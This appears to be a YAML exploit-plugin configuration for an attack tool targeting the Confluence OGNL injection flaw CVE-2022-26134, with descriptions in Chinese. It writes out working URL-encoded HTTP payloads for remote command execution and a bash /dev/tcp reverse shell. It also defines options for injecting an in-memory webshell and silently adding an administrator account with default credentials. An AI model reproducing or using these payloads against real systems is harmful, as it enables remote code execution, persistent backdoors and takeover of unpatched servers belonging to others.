info:
    app: Confluence
    name: CVE-2022-26134
    author: 小晨曦 Modify By lz520520
    plugin_version: 1.0.0
    disclosure_date: "2022-06-06"
    create_date: "2024-10-06 06:51:24"
    update_date: "2024-10-06 06:51:24"
    scope: |-
        1.3.0 <= Confluence Server and Data Center < 7.4.17
        7.13.0 <= Confluence Server and Data Center < 7.13.7
        7.14.0 <= Confluence Server and Data Center < 7.14.3
        7.15.0 <= Confluence Server and Data Center < 7.15.2
        7.16.0 <= Confluence Server and Data Center < 7.16.4
        7.17.0 <= Confluence Server and Data Center < 7.17.4
        7.18.0 <= Confluence Server and Data Center < 7.18.1
    description: Atlassian Confluence OGNL表达式注入漏洞
    vul_id: CVE-2022-26134
    detail: |-
        payload1: 检测漏洞、命令执行及反弹shell（<7.17.4）
        payload2: 检测漏洞、命令执行、反弹shell、内存马注入（<7.18.1）
                  内存马注入无需填写任何信息，直接点击上去即可，成功后返回连接信息
        payload3: 添加用户，用户名（必须小写），密码，邮箱（可置空），全名（可置空） 无回显（<7.18.1）
    payload: |-
        命令执行：
        GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
        Host: your-ip:8090
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Connection: close

        反弹shell：
        GET /%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1
        Host: your-ip:8090
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Connection: close
    reference: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
    vul_type: 代码执行
payloads:
    - name: check1
      alias: 检测漏洞（<7.17.4）
    - name: cmd1
      alias: 命令执行（<7.17.4）
      params:
          - key: cmd
            title: 命令
            param_type: edit
            default_value: whoami
            required: true
    - name: reverse1
      alias: 反弹shell（<7.17.4）
      params:
          - key: ip
            title: IP
            param_type: edit
            default_value: ""
            required: true
          - key: port
            title: 端口
            param_type: edit
            default_value: ""
            required: true
    - name: check2
      alias: 检测漏洞（<7.18.1）
    - name: cmd2
      alias: 命令执行（<7.18.1）
      params:
          - key: cmd
            title: 命令
            param_type: edit
            default_value: whoami
            required: true
    - name: reverse2
      alias: 反弹shell（<7.18.1）
      params:
          - key: ip
            title: IP
            param_type: edit
            default_value: ""
            required: true
          - key: port
            title: 端口
            param_type: edit
            default_value: ""
            required: true
    - name: upload2
      alias: 内存马注入（<7.18.1）
    - name: adduser
      alias: 添加用户（<7.18.1）
      params:
          - key: user
            title: 用户名
            param_type: edit
            tips: 必须小写
            default_value: confluence-admins
            required: true
          - key: pwd
            title: 密码
            param_type: edit
            default_value: Test@1234
            required: true
          - key: mail
            title: 邮箱
            param_type: edit
            default_value: confluence-admins@confluence.com
          - key: display
            title: 显示
            param_type: edit
            default_value: Confluence-admins